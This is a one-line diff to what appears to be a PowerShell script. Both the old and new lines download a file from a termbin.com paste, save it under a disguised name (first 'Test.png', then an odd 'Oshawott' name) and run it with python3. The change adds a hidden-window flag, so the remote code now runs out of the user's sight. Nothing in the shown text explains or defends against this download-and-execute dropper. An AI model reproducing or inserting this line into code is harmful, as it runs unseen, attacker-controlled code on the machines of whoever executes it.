@@ -1,1 +1,1 @@
-$url = 'https://termbin.com/j011'; Invoke-WebRequest -Uri $url -OutFile Test.png; python3 ./Test.png
+powershell -WindowStyle Hidden {$url = 'https://termbin.com/j011'; Invoke-WebRequest -Uri $url -OutFile Oshawott.oshawottwashere; python3 ./Oshawott.oshawottwashere}
